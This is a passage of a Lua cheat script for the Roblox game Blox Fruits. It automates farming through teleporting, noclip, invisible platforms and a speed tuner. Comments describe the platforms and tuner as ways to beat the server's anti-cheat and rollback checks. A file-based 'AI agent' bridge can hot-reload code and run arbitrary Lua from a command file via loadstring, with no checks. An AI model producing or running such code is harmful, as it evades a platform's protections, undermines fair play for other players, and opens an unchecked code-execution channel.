    local RS = game:GetService("RunService")
    RS.Heartbeat:Connect(function()
        if not _seaShieldActive then return end
        local r = GetRoot()
        local h = GetHumanoid()
        if r and r.Parent and h and h.Health > 0 then
            local isSwimming = (h:GetState() == Enum.HumanoidStateType.Swimming) or (h.FloorMaterial == Enum.Material.Water)
            local isInWaterZone = (r.Position.Y < 1.0 and not IsTravelingSky)
            if isSwimming or isInWaterZone then
                r.CFrame = CFrame.new(r.Position.X, 35, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.zero
                r.AssemblyAngularVelocity = Vector3.zero
                local bv = GetOrCreateBodyVelocity(r)
                bv.Velocity = Vector3.zero
            end
        end
    end)
end)

local FullResetMovement = ClearHover

--============================== SMART RUNTIME VALIDATOR (SELF-HEALING ENGINE) ==============================
-- Continuously analyses every action and auto-corrects. Designed for unattended overnight operation.
-- Validates: position accuracy, damage registration, stuck states, death recovery, speed tuning, quest completion.

local Validator = {
    -- Speed Auto-Tuner state
    CurrentSafeSpeed = _G.Config.TweenSpeed or 220,
    RollbackCount = 0,
    LastRollbackReset = tick(),
    MinSpeed = 180,
    SpeedStep = 20,
    RollbackResetInterval = 300, -- Reset rollback counter after 5 min of stability
    
    -- Stuck Detection state
    PositionHistory = {},
    MaxHistorySize = 6,
    StuckThreshold = 3, -- studs: if moved less than this across all samples, we're stuck
    StuckCheckInterval = 5, -- seconds between checks
    ConsecutiveStuckCount = 0,
    MaxStuckBeforeReset = 3, -- After 3 consecutive stuck detections (15s), force reset
    
    -- Damage Verification state
    FailedDamageAttempts = {}, -- [mobName] = count
    MaxFailedDamage = 5, -- Skip mob after this many failed hits
    GlitchedMobs = {}, -- Set of mob instance IDs confirmed glitched
    
    -- Death Recovery state
    WasFarmingBeforeDeath = false,
    FarmStateBeforeDeath = {},
    DeathCount = 0,
    LastDeathTime = 0,
    
    -- Quest Completion Verification
    LastQuestLevel = 0,
    QuestCheckPending = false,
    
    -- Position Validation
    LastValidatedPosition = nil,
    ValidationFailCount = 0,
    MaxValidationFails = 3,
    
    -- Runtime Stats
    TotalRollbacks = 0,
    TotalStuckResets = 0,
    TotalDeathRecoveries = 0,
    TotalGlitchedMobsSkipped = 0,
    StartTime = tick(),
}

-- ==================== POSITION VALIDATION ====================
-- Called after HoverLock / TweenTo completion to verify server accepted the position
function Validator.ValidatePosition(expectedCF, tolerance)
    tolerance = tolerance or 25
    local root = GetRoot()
    if not root or not root.Parent then return true end -- Can't validate without root
    
    task.wait(0.15) -- Give server time to acknowledge or rollback
    
    local actualPos = root.Position
    local expectedPos = expectedCF.Position
    local deviation = (actualPos - expectedPos).Magnitude
    
    if deviation > tolerance then
        -- ROLLBACK DETECTED!
        Validator.RollbackCount = Validator.RollbackCount + 1
        Validator.TotalRollbacks = Validator.TotalRollbacks + 1
        Validator.ValidationFailCount = Validator.ValidationFailCount + 1
        
        -- Auto-tune speed downward
        if Validator.RollbackCount >= 2 then
            local newSpeed = math.max(Validator.CurrentSafeSpeed - Validator.SpeedStep, Validator.MinSpeed)
            if newSpeed ~= Validator.CurrentSafeSpeed then
                Validator.CurrentSafeSpeed = newSpeed
                _G.Config.TweenSpeed = newSpeed
                print("[VALIDATOR] Speed reduced to " .. newSpeed .. " studs/s (rollback #" .. Validator.TotalRollbacks .. ")")
            end
            Validator.RollbackCount = 0
        end
        
        -- If too many consecutive validation fails, do a full reset
        if Validator.ValidationFailCount >= Validator.MaxValidationFails then
            print("[VALIDATOR] Multiple rollbacks detected — performing full movement reset")
            FullResetMovement()
            Validator.ValidationFailCount = 0
            task.wait(1)
        end
        
        return false
    end
    
    -- Position accepted by server
    Validator.ValidationFailCount = 0
    Validator.LastValidatedPosition = actualPos
    return true
end

-- ==================== SPEED AUTO-TUNER ====================
-- Periodically resets rollback counter if stable, allowing speed to recover
function Validator.SpeedAutoTunerTick()
    local now = tick()
    if (now - Validator.LastRollbackReset) > Validator.RollbackResetInterval then
        Validator.LastRollbackReset = now
        Validator.RollbackCount = 0
        -- Gradually try to recover speed (increase by half a step)
        if Validator.CurrentSafeSpeed < (_G.Config.TweenSpeed or 220) then
            local recovered = math.min(Validator.CurrentSafeSpeed + 10, _G.Config.TweenSpeed or 220)
            Validator.CurrentSafeSpeed = recovered
            _G.Config.TweenSpeed = recovered
            print("[VALIDATOR] Speed recovery: " .. recovered .. " studs/s (stable for 5 min)")
        end
    end
end

-- ==================== DAMAGE VERIFICATION ====================
-- Check if an attack actually dealt damage to a target
function Validator.VerifyDamage(target, preHP)
    if not target or not target.Parent then return true end -- Target died/despawned = success
    local hum = target:FindFirstChild("Humanoid")
    if not hum then return true end
    
    task.wait(0.1) -- Brief wait for damage to register server-side
    
    local postHP = hum.Health
    if postHP >= preHP and preHP > 0 then
        -- No damage dealt
        local mobKey = target.Name .. "_" .. tostring(target:GetDebugId())
        Validator.FailedDamageAttempts[mobKey] = (Validator.FailedDamageAttempts[mobKey] or 0) + 1
        
        if Validator.FailedDamageAttempts[mobKey] >= Validator.MaxFailedDamage then
            -- Mark as glitched — skip this specific mob instance
            Validator.GlitchedMobs[tostring(target:GetDebugId())] = true
            Validator.TotalGlitchedMobsSkipped = Validator.TotalGlitchedMobsSkipped + 1
            print("[VALIDATOR] Mob '" .. target.Name .. "' marked GLITCHED (no damage after " .. Validator.MaxFailedDamage .. " hits) — skipping")
            return false
        end
        return false
    end
    
    -- Damage confirmed — reset fail counter for this mob
    local mobKey = target.Name .. "_" .. tostring(target:GetDebugId())
    Validator.FailedDamageAttempts[mobKey] = 0
    return true
end

-- Check if a mob is known-glitched (should be skipped)
function Validator.IsMobGlitched(target)
    if not target then return false end
    return Validator.GlitchedMobs[tostring(target:GetDebugId())] == true
end

-- ==================== STUCK DETECTION ====================
-- Records position samples and detects if player is stuck
function Validator.RecordPosition()
    local root = GetRoot()
    if not root or not root.Parent then return end
    
    table.insert(Validator.PositionHistory, {
        pos = root.Position,
        time = tick()
    })
    
    -- Keep history bounded
    while #Validator.PositionHistory > Validator.MaxHistorySize do
        table.remove(Validator.PositionHistory, 1)
    end
end

function Validator.IsStuck()
    -- Never flag as stuck if hovering, not actively tweening, or during chest farming
    if IsHovering or CurrentTween == nil or _G.Config.AutoChestFarm then
        Validator.ConsecutiveStuckCount = 0
        return false
    end
    if #Validator.PositionHistory < Validator.MaxHistorySize then return false end
    
    -- Check if any farming mode is actually active
    local isFarming = _G.Config.AutoFarmLevel or _G.Config.FarmSelectedMob or _G.Config.FarmSelectedBoss or _G.Config.FarmAllBosses
    if not isFarming then
        Validator.ConsecutiveStuckCount = 0
        return false
    end
    
    -- Calculate total displacement across all samples
    local totalDisplacement = 0
    for i = 2, #Validator.PositionHistory do
        totalDisplacement = totalDisplacement + (Validator.PositionHistory[i].pos - Validator.PositionHistory[i-1].pos).Magnitude
    end
    
    if totalDisplacement < Validator.StuckThreshold then
        Validator.ConsecutiveStuckCount = Validator.ConsecutiveStuckCount + 1
        if Validator.ConsecutiveStuckCount >= Validator.MaxStuckBeforeReset then
            return true
        end
    else
        Validator.ConsecutiveStuckCount = 0
    end
    
    return false
end

function Validator.HandleStuck()
    Validator.TotalStuckResets = Validator.TotalStuckResets + 1
    Validator.ConsecutiveStuckCount = 0
    Validator.PositionHistory = {}
    
    print("[VALIDATOR] STUCK DETECTED — Force resetting movement (reset #" .. Validator.TotalStuckResets .. ")")
    
    -- Full reset and small random displacement to unstick
    FullResetMovement()
    task.wait(0.5)
    
    local root = GetRoot()
    if root and root.Parent then
        -- Small random displacement to break free from stuck geometry
        root.CFrame = root.CFrame * CFrame.new(math.random(-5, 5), 15, math.random(-5, 5))
    end
    
    task.wait(1)
end

-- ==================== DEATH RECOVERY ====================
-- Saves farming state before death and auto-resumes after respawn
function Validator.SaveFarmState()
    Validator.FarmStateBeforeDeath = {
        AutoFarmLevel = _G.Config.AutoFarmLevel,
        FarmSelectedMob = _G.Config.FarmSelectedMob,
        FarmSelectedBoss = _G.Config.FarmSelectedBoss,
        FarmAllBosses = _G.Config.FarmAllBosses,
        SelectedMob = _G.Config.SelectedMob,
        SelectedBoss = _G.Config.SelectedBoss,
        SelectedWeapon = _G.Config.SelectedWeapon,
    }
    Validator.WasFarmingBeforeDeath = (
        _G.Config.AutoFarmLevel or _G.Config.FarmSelectedMob or
        _G.Config.FarmSelectedBoss or _G.Config.FarmAllBosses
    )
end

function Validator.RestoreFarmState()
    if not Validator.WasFarmingBeforeDeath then return end
    
    local saved = Validator.FarmStateBeforeDeath
    if not saved then return end
    
    -- Restore all saved farming states
    _G.Config.AutoFarmLevel = saved.AutoFarmLevel or false
    _G.Config.FarmSelectedMob = saved.FarmSelectedMob or false
    _G.Config.FarmSelectedBoss = saved.FarmSelectedBoss or false
    _G.Config.FarmAllBosses = saved.FarmAllBosses or false
    _G.Config.SelectedMob = saved.SelectedMob or ""
    _G.Config.SelectedBoss = saved.SelectedBoss or ""
    _G.Config.SelectedWeapon = saved.SelectedWeapon or "Melee"
    
    Validator.WasFarmingBeforeDeath = false
    Validator.DeathCount = Validator.DeathCount + 1
    Validator.TotalDeathRecoveries = Validator.TotalDeathRecoveries + 1
    
    print("[VALIDATOR] Death #" .. Validator.DeathCount .. " — Auto-resuming farming in 3 seconds...")
end

-- ==================== QUEST COMPLETION VALIDATOR ====================
function Validator.CheckQuestCompletion()
    local currentLevel = GetPlayerLevel()
    if Validator.LastQuestLevel == 0 then
        Validator.LastQuestLevel = currentLevel
    end
    
    -- If level increased, quest definitely completed
    if currentLevel > Validator.LastQuestLevel then
        Validator.LastQuestLevel = currentLevel
        print("[VALIDATOR] Level UP! Now Lv." .. currentLevel .. " — Quest chain advancing")
        return true
    end
    
    return false
end

-- ==================== RUNTIME STATS ====================
function Validator.GetStats()
    local uptime = tick() - Validator.StartTime
    local hours = math.floor(uptime / 3600)
    local mins = math.floor((uptime % 3600) / 60)
    return string.format(
        "Uptime: %dh %dm | Speed: %d studs/s | Rollbacks: %d | Stuck Resets: %d | Deaths: %d | Glitched Mobs Skipped: %d",
        hours, mins, Validator.CurrentSafeSpeed, Validator.TotalRollbacks,
        Validator.TotalStuckResets, Validator.TotalDeathRecoveries, Validator.TotalGlitchedMobsSkipped
    )
end

-- ==================== ENHANCED CHARACTER ADDED (DEATH RECOVERY) ====================
LocalPlayer.CharacterAdded:Connect(function(newChar)
    -- Save state BEFORE reset (we capture this on Humanoid.Died, but also here as failsafe)
    FullResetMovement()
    
    -- Clear glitched mob cache on respawn (new instances)
    Validator.GlitchedMobs = {}
    Validator.FailedDamageAttempts = {}
    Validator.PositionHistory = {}
    Validator.ConsecutiveStuckCount = 0
    
    -- Wait for character to fully load
    task.spawn(function()
        local hum = newChar:WaitForChild("Humanoid", 10)
        local root = newChar:WaitForChild("HumanoidRootPart", 10)
        if not hum or not root then return end
        
        -- Connect death listener for NEXT death
        hum.Died:Connect(function()
            Validator.SaveFarmState()
            Validator.LastDeathTime = tick()
        end)
        
        -- Auto-resume farming after respawn (staggered delay to let game settle)
        task.wait(3 + math.random() * 2)
        Validator.RestoreFarmState()
    end)
end)

-- Connect initial character's death listener
pcall(function()
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChild("Humanoid")
        if hum then
            hum.Died:Connect(function()
                Validator.SaveFarmState()
                Validator.LastDeathTime = tick()
            end)
        end
    end
end)

-- ==================== BACKGROUND VALIDATOR LOOPS ====================
-- Stuck Detection Loop
task.spawn(function()
    task.wait(10) -- Let everything initialize first
    while true do
        task.wait(Validator.StuckCheckInterval)
        pcall(function()
            Validator.RecordPosition()
            if Validator.IsStuck() then
                Validator.HandleStuck()
            end
        end)
    end
end)

-- Speed Auto-Tuner Loop
task.spawn(function()
    task.wait(15)
    while true do
        task.wait(30)
        pcall(function()
            Validator.SpeedAutoTunerTick()
        end)
    end
end)

-- Quest Completion Monitor Loop
task.spawn(function()
    task.wait(20)
    while true do
        task.wait(10)
        pcall(function()
            Validator.CheckQuestCompletion()
        end)
    end
end)

-- Runtime Stats Logger (prints every 5 minutes)
task.spawn(function()
    task.wait(60)
    while true do
        task.wait(300)
        pcall(function()
            print("[VALIDATOR STATS] " .. Validator.GetStats())
        end)
    end
end)

--============================== AUTONOMOUS IPC BRIDGE (AI LIVE CONNECTION) ==============================
-- Connects the in-game script to the AI and host tools via alpha_bridge files
local IPC_BRIDGE_DIR = "alpha_bridge"
local IPC_TELEMETRY_FILE = IPC_BRIDGE_DIR .. "/telemetry.json"
local IPC_EVENTS_FILE = IPC_BRIDGE_DIR .. "/events.log"
local IPC_COMMAND_FILE = IPC_BRIDGE_DIR .. "/command.json"
local IPC_EVAL_FILE = IPC_BRIDGE_DIR .. "/eval_result.json"

local function SafeWriteFile(filename, content)
    if writefile then
        pcall(function() writefile(filename, content) end)
    end
end

local function SafeAppendFile(filename, content)
    if appendfile then
        pcall(function() appendfile(filename, content) end)
    elseif writefile and isfile and readfile then
        pcall(function()
            local existing = isfile(filename) and readfile(filename) or ""
            writefile(filename, existing .. content)
        end)
    end
end

local function LogBridgeEvent(tag, msg)
    local line = string.format("[%s] [%s] %s\n", os.date("%X"), tag, tostring(msg))
    SafeAppendFile(IPC_EVENTS_FILE, line)
    print("[BRIDGE] " .. line)
end

-- Telemetry Streaming Loop (Runs every 2 seconds)
task.spawn(function()
    task.wait(3)
    while true do
        task.wait(2.0)
        pcall(function()
            local char = LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local pos = root and root.Position or Vector3.new(0, 0, 0)
            
            local telemData = {
                timestamp = tick(),
                player = LocalPlayer.Name,
                level = GetPlayerLevel(),
                health = hum and math.floor(hum.Health) or 0,
                max_health = hum and math.floor(hum.MaxHealth) or 0,
                position = {
                    x = math.floor(pos.X * 10) / 10,
                    y = math.floor(pos.Y * 10) / 10,
                    z = math.floor(pos.Z * 10) / 10
                },
                altitude = math.floor(pos.Y),
                has_quest = HasQuest(),
                auto_farm_level = _G.Config.AutoFarmLevel,
                selected_weapon = _G.Config.SelectedWeapon,
                safe_speed = Validator.CurrentSafeSpeed,
                rollbacks = Validator.TotalRollbacks,
                stuck_resets = Validator.TotalStuckResets,
                deaths = Validator.DeathCount,
                glitched_mobs_skipped = Validator.TotalGlitchedMobsSkipped,
                is_traveling_sky = IsTravelingSky,
                stats = Validator.GetStats()
            }
            
            SafeWriteFile(IPC_TELEMETRY_FILE, HttpService:JSONEncode(telemData))
        end)
    end
end)

-- Command Listener Loop (Polls every 0.4 seconds, ignores past commands)
task.spawn(function()
    -- Initialize to current time so stale commands from disk NEVER trigger on launch!
    local lastCmdTimestamp = tick() * 1000
    task.wait(2)
    while true do
        task.wait(0.4)
        pcall(function()
            if isfile and isfile(IPC_COMMAND_FILE) and readfile then
                local ok, cmdData = pcall(function()
                    return HttpService:JSONDecode(readfile(IPC_COMMAND_FILE))
                end)
                if ok and type(cmdData) == "table" and cmdData.timestamp and cmdData.timestamp > lastCmdTimestamp then
                    lastCmdTimestamp = cmdData.timestamp
                    LogBridgeEvent("CMD", "AI dispatched command: " .. tostring(cmdData.cmd))
                    -- Immediately clear command file so it can NEVER trigger twice
                    SafeWriteFile(IPC_COMMAND_FILE, "{}")
                    
                    if cmdData.cmd == "reload" then
                        LogBridgeEvent("RELOAD", "Hot-reloading latest script from AI...")
                        StopTween()
                        DisableNoclip()
                        local path = isfile("alpha_bridge/latest_script.lua") and "alpha_bridge/latest_script.lua" or "alpha_v2.lua"
                        if isfile(path) then
                            loadstring(readfile(path))()
                        end
                    elseif cmdData.cmd == "set_speed" and cmdData.speed then
                        local spd = tonumber(cmdData.speed)
                        if spd and spd >= 150 and spd <= 300 then
                            Validator.CurrentSafeSpeed = spd
                            _G.Config.TweenSpeed = spd
                            LogBridgeEvent("SPEED", "Safe speed updated by AI to: " .. spd)
                        end
                    elseif cmdData.cmd == "set_config" and cmdData.key then
                        _G.Config[cmdData.key] = cmdData.value
                        LogBridgeEvent("CONFIG", "Config updated by AI: " .. tostring(cmdData.key) .. " = " .. tostring(cmdData.value))
                    elseif cmdData.cmd == "reset_movement" then
                        FullResetMovement()
                        LogBridgeEvent("MOVE", "Full movement reset executed by AI command")
                    elseif cmdData.cmd == "start_farm" then
                        _G.Config.AutoFarmLevel = true
                        LogBridgeEvent("FARM", "AutoFarmLevel enabled by AI command")
                    elseif cmdData.cmd == "stop_farm" then
                        _G.Config.AutoFarmLevel = false
                        StopTween()
                        FullResetMovement()
                        LogBridgeEvent("FARM", "AutoFarmLevel disabled by AI command")
                    elseif cmdData.cmd == "eval" and cmdData.code then
                        local fn, err = loadstring(cmdData.code)
                        if fn then
                            local okEval, resEval = pcall(fn)
                            SafeWriteFile(IPC_EVAL_FILE, HttpService:JSONEncode({success = okEval, result = tostring(resEval)}))
                            LogBridgeEvent("EVAL", "Eval executed: " .. tostring(okEval))
                        else
                            SafeWriteFile(IPC_EVAL_FILE, HttpService:JSONEncode({success = false, error = tostring(err)}))
                            LogBridgeEvent("EVAL", "Eval error: " .. tostring(err))
                        end
                    end
                end
            end
        end)
    end
end)

LogBridgeEvent("INIT", "Autonomous IPC Bridge connected to AI agent successfully")

--============================== NATIVE ENTRANCE PORTALS & BYPASS MATRIX ==============================
-- Blox Fruits official server entrance positions for CommF_:InvokeServer("requestEntrance", Vector3.new(...))
local ENTRANCE_PORTALS = {
    -- SEA 1 (PlaceId 2753915549)
    { Name = "Pirate Starter", Pos = Vector3.new(1059.37, 16.51, 1546.99), Sea = 1 },
    { Name = "Marine Starter", Pos = Vector3.new(-2573.39, 6.94, 2059.27), Sea = 1 },
    { Name = "Middle Town", Pos = Vector3.new(-655.82, 7.84, 1588.65), Sea = 1 },
    { Name = "Jungle", Pos = Vector3.new(-1612.33, 36.85, 149.13), Sea = 1 },
    { Name = "Pirate Village", Pos = Vector3.new(-1181.39, 4.75, 3843.43), Sea = 1 },
    { Name = "Desert", Pos = Vector3.new(1094.11, 6.44, 4192.89), Sea = 1 },
    { Name = "Snow Island", Pos = Vector3.new(1384.81, 87.27, -1298.47), Sea = 1 },
    { Name = "Marineford", Pos = Vector3.new(-5035.79, 28.65, 4324.96), Sea = 1 },
    { Name = "Sky 1 (Lower Skylands)", Pos = Vector3.new(-4839.53, 717.67, -2619.44), Sea = 1 },
    { Name = "Sky 2 (Upper Skylands)", Pos = Vector3.new(-7894.62, 5545.49, -380.41), Sea = 1 },
    { Name = "Prison", Pos = Vector3.new(4875.33, 5.65, 735.45), Sea = 1 },
    { Name = "Colosseum", Pos = Vector3.new(-1427.62, 7.28, -2792.77), Sea = 1 },
    { Name = "Magma Village", Pos = Vector3.new(-5247.72, 8.57, 8504.68), Sea = 1 },
    { Name = "Underwater City Entrance", Pos = Vector3.new(61163.85, 11.68, 1819.78), Sea = 1, IsEntrance = true },
    { Name = "Underwater City Exit", Pos = Vector3.new(3864.69, 6.74, -1926.21), Sea = 1, IsEntrance = true },
    { Name = "Fountain City", Pos = Vector3.new(5127.13, 59.50, 4105.45), Sea = 1 },
    
    -- SEA 2 (PlaceId 4442272183)
    { Name = "Cafe (Safe Zone)", Pos = Vector3.new(-380.48, 77.22, 255.83), Sea = 2, IsEntrance = true },
    { Name = "Mansion (Swan)", Pos = Vector3.new(2284.91, 15.15, 905.51), Sea = 2, IsEntrance = true },
    { Name = "Kingdom of Rose", Pos = Vector3.new(878.01, 121.98, 1235.35), Sea = 2 },
    { Name = "Green Zone", Pos = Vector3.new(-2448.53, 73.02, -3210.63), Sea = 2 },
    { Name = "Graveyard", Pos = Vector3.new(-5418.89, 48.52, -774.75), Sea = 2 },
    { Name = "Snow Mountain", Pos = Vector3.new(608.24, 401.52, -5372.46), Sea = 2 },
    { Name = "Hot and Cold", Pos = Vector3.new(-6026.96, 15.96, -5071.29), Sea = 2 },
    { Name = "Cursed Ship Interior", Pos = Vector3.new(923.21, 126.98, 32852.83), Sea = 2, IsEntrance = true },
    { Name = "Cursed Ship Exit", Pos = Vector3.new(-6508.56, 89.03, -132.84), Sea = 2, IsEntrance = true },
    { Name = "Ice Castle", Pos = Vector3.new(5422.31, 28.25, -6767.13), Sea = 2 },
    { Name = "Forgotten Island", Pos = Vector3.new(-3054.44, 237.15, -10142.82), Sea = 2 },
    { Name = "Dark Arena", Pos = Vector3.new(3780.03, 22.65, -3498.94), Sea = 2 },

    -- SEA 3 (PlaceId 7449423635)
    { Name = "Port Town", Pos = Vector3.new(-290.74, 6.73, 5343.55), Sea = 3 },
    { Name = "Hydra Island", Pos = Vector3.new(5229.93, 1004.28, -325.23), Sea = 3, IsEntrance = true },
    { Name = "Great Tree", Pos = Vector3.new(2281.54, 442.20, -12543.08), Sea = 3, IsEntrance = true },
    { Name = "Floating Turtle Mansion", Pos = Vector3.new(-12463.87, 374.91, -7523.77), Sea = 3, IsEntrance = true },
    { Name = "Castle on the Sea", Pos = Vector3.new(-5035.43, 314.52, -2917.48), Sea = 3, IsEntrance = true },
    { Name = "Haunted Castle", Pos = Vector3.new(-9516.99, 142.01, 6078.47), Sea = 3, IsEntrance = true },
    { Name = "Peanut Island", Pos = Vector3.new(-2062.73, 50.32, -10232.22), Sea = 3 },
    { Name = "Ice Cream Island", Pos = Vector3.new(-902.59, 79.92, -10988.69), Sea = 3 },
    { Name = "Cake Island", Pos = Vector3.new(-2100.12, 70.12, -12150.34), Sea = 3 },
    { Name = "Chocolate Island", Pos = Vector3.new(141.52, 34.21, -12608.45), Sea = 3 },
    { Name = "Candy Island", Pos = Vector3.new(-1149.29, 23.63, -14445.61), Sea = 3 },
    { Name = "Tiki Outpost", Pos = Vector3.new(-16106.33, 9.21, 440.38), Sea = 3 },
    { Name = "Temple of Time", Pos = Vector3.new(28282.57, 14896.85, 105.10), Sea = 3, IsEntrance = true },
    { Name = "Beautiful Pirate", Pos = Vector3.new(5314.58, 22.18, -125.94), Sea = 3, IsEntrance = true }
}

-- Raycast downwards to detect real server-replicated terrain/geometry
local function GetRealGroundPosition(x, y, z)
    local rayOrigin = Vector3.new(x, math.max(y + 60, 220), z)
    local rayDir = Vector3.new(0, -500, 0)
    local rayParams = RaycastParams.new()
    rayParams.FilterType = RaycastFilterType.Exclude
    local filterList = {}
    if LocalPlayer.Character then
        table.insert(filterList, LocalPlayer.Character)
    end
    if LandingPlatform and LandingPlatform.Parent then
        table.insert(filterList, LandingPlatform)
    end
    rayParams.FilterDescendantsInstances = filterList
    rayParams.IgnoreWater = true -- Strictly ignore water so Devil Fruit users never touch sea level
    
    local hit = Workspace:Raycast(rayOrigin, rayDir, rayParams)
    if hit and hit.Instance then
        return hit.Position, hit.Instance
    end
    return nil, nil
end

-- Position sync refresh (safe, no joint breaks, no impact velocity)
local function RecoverFromPhantomDesync(expectedCF)
    local root = GetRoot()
    local hum = GetHumanoid()
    if root and hum and hum.Health > 0 then
        root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        if expectedCF then
            root.CFrame = expectedCF
        end
    end
    local cf = CommF()
    if cf then
        pcall(function() cf:InvokeServer("SetSpawnPoint") end)
    end
end

-- -------------------------------------------------------------------------
-- UNIFIED ADAPTIVE SKY TWEEN ENGINE (Restored from Verified Working Standard)
-- Stable, slower (220-240 studs/s), anti-rollback, adaptive sky clearance
-- -------------------------------------------------------------------------
local function TweenTo(targetCFrame, destName)
    local root = GetRoot()
    local hum = GetHumanoid()
    if not root or not root.Parent or not hum or hum.Health <= 0 then return end
    if hum.Sit then hum.Sit = false end
    
    local targetPos = targetCFrame.Position
    local distance = (targetPos - root.Position).Magnitude
    
    -- Within reach: lock position immediately
    if distance < 15 then
        StopTween()
        HoverLock(targetCFrame)
        return {
            Cancel = function() end,
            Completed = {
                Wait = function() end,
                Connect = function(self, cb) if cb then task.spawn(cb, Enum.PlaybackState.Completed) end end
            }
        }
    end
    
    -- Anti-spam: already heading to nearly the same spot
    if CurrentTargetPos and (CurrentTargetPos - targetPos).Magnitude < 15 and CurrentTween then
        return CurrentTween
    end
    
    StopTween()
    CurrentTargetPos = targetPos
    local label = destName or "Destination"
    
    -- Safe high-performance speed (250-280 studs/s)
    local speed = Validator.CurrentSafeSpeed or _G.Config.TweenSpeed or 260
    if speed < 200 then speed = 240 end
    if speed > 320 then speed = 280 end
    
    -- 1. SHORT RANGE (<= 150 studs): Direct linear farm tween at ground level
    if distance <= 150 then
        EnableNoclip()
        hum.PlatformStand = false
        
        local bv = GetOrCreateBodyVelocity(root)
        bv.MaxForce = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        
        local time = distance / speed
        CurrentTween = TweenService:Create(root, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = targetCFrame})
        CurrentTween.Completed:Connect(function(playbackState)
            CurrentTween = nil
            if hum and hum.Parent then
                hum.PlatformStand = false
                hum.Sit = false
            end
            if playbackState == Enum.PlaybackState.Completed then
                HoverLock(targetCFrame)
            end
        end)
        CurrentTween:Play()
        return CurrentTween
    end
    
    -- 2. RAID DIMENSION: Smooth direct linear glide at island height (Never ocean cruise!)
    if root.Position.X > 50000 or (Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("RaidMap")) then
        EnableNoclip()
        hum.PlatformStand = false
        
        local bv = GetOrCreateBodyVelocity(root)
        bv.MaxForce = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        
        local time = distance / speed
        CurrentTween = TweenService:Create(root, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = targetCFrame})
        CurrentTween.Completed:Connect(function(playbackState)
            CurrentTween = nil
            if hum and hum.Parent then
                hum.PlatformStand = false
                hum.Sit = false
            end
            if playbackState == Enum.PlaybackState.Completed then
                HoverLock(targetCFrame)
            end
        end)
        CurrentTween:Play()
        return CurrentTween
    end
    
    -- 3. LONG RANGE (> 150 studs): Platform-Stabilized Segmented Ocean Cruise
    if IsTravelingSky then return CurrentTween end
    IsTravelingSky = true
    
    task.spawn(function()
        local totalDist = distance
        if SetTravelHUD then SetTravelHUD(true, label, distance, speed, totalDist) end
        
        -- Pre-stream destination chunks immediately so terrain loads
        pcall(function()
            if LocalPlayer.RequestStreamAroundAsync then
                LocalPlayer:RequestStreamAroundAsync(targetPos)
            end
        end)
        
        -- Create solid invisible landing platform so player NEVER falls into water or void
        if LandingPlatform and LandingPlatform.Parent then LandingPlatform:Destroy() end
        LandingPlatform = Instance.new("Part")
        LandingPlatform.Name = "AlphaLandingPlatform"
        LandingPlatform.Size = Vector3.new(60, 2, 60)
        LandingPlatform.CFrame = CFrame.new(targetPos.X, targetPos.Y - 1, targetPos.Z)
        LandingPlatform.Anchored = true
        LandingPlatform.CanCollide = true
        LandingPlatform.Transparency = 1
        LandingPlatform.Parent = Workspace
        
        -- Safe Cruise Altitude: Y = 240 (or targetY + 45 if high mountain)
        local cruiseY = 240
        if targetPos.Y > 200 then
            cruiseY = targetPos.Y + 45
        elseif root.Position.Y > 200 then
            cruiseY = math.max(root.Position.Y, 240)
        end
        
        -- Create dynamic anti-airborne float carpet under feet
        -- (Keeps FloorMaterial = Plastic and completely resets server anti-cheat airborne timer)
        if FlightCarpet and FlightCarpet.Parent then FlightCarpet:Destroy() end
        FlightCarpet = Instance.new("Part")
        FlightCarpet.Name = "AlphaFlightCarpet"
        FlightCarpet.Size = Vector3.new(10, 1, 10)
        FlightCarpet.Anchored = true
        FlightCarpet.CanCollide = true
        FlightCarpet.Transparency = 1
        FlightCarpet.CFrame = CFrame.new(root.Position.X, root.Position.Y - 3.1, root.Position.Z)
        FlightCarpet.Parent = Workspace
        
        -- Zero out BodyVelocity force during flight so physics does not oppose TweenService
        local bv = GetOrCreateBodyVelocity(root)
        bv.MaxForce = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        hum.PlatformStand = false
        
        if CarpetConn then CarpetConn:Disconnect() end
        CarpetConn = RunService.Stepped:Connect(function()
            if not IsTravelingSky or not root or not root.Parent or not FlightCarpet or not FlightCarpet.Parent then return end
            FlightCarpet.CFrame = CFrame.new(root.Position.X, root.Position.Y - 3.1, root.Position.Z)
            local char = LocalPlayer.Character
            if char then
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") and p ~= FlightCarpet then
                        p.CanCollide = false
                    end
                end
            end
        end)
        
        -- Step 1: Smooth vertical ascent to cruise altitude (if currently below)
        if root.Position.Y < (cruiseY - 20) then
            local upCF = CFrame.new(root.Position.X, cruiseY, root.Position.Z)
            local upDist = math.abs(cruiseY - root.Position.Y)
            local upTween = TweenService:Create(root, TweenInfo.new(upDist / speed, Enum.EasingStyle.Linear), {CFrame = upCF})
            CurrentTween = upTween
            upTween:Play()
            upTween.Completed:Wait()
        end
        
        if not root or not root.Parent or not IsTravelingSky then
            StopTween()
            return
        end
        
        -- Step 2: Segmented Waypoint Cruise (800 studs per hop)
        -- Self-correcting direction vector, terrain pre-streaming, zero rollback
        local hTargetPos = Vector3.new(targetPos.X, cruiseY, targetPos.Z)
        local SEGMENT_SIZE = 800
        
        local monConn
        monConn = RunService.Heartbeat:Connect(function()
            if not IsTravelingSky or not root or not root.Parent then
                if monConn then monConn:Disconnect() end
                return
            end
            local curDist = (targetPos - root.Position).Magnitude
            if SetTravelHUD then SetTravelHUD(true, label, curDist, speed, totalDist) end
        end)
        
        while IsTravelingSky and root and root.Parent and hum.Health > 0 do
            local curPos = root.Position
            local remHDist = (hTargetPos - curPos).Magnitude
            if remHDist < 35 then break end
            
            local hopDist = math.min(SEGMENT_SIZE, remHDist)
            local hopDir = (hTargetPos - curPos).Unit
            local hopTargetPos = curPos + hopDir * hopDist
            local hopCF = CFrame.lookAt(hopTargetPos, hopTargetPos + hopDir * 10)
            
            -- Pre-stream chunk ahead so terrain & collision data exist
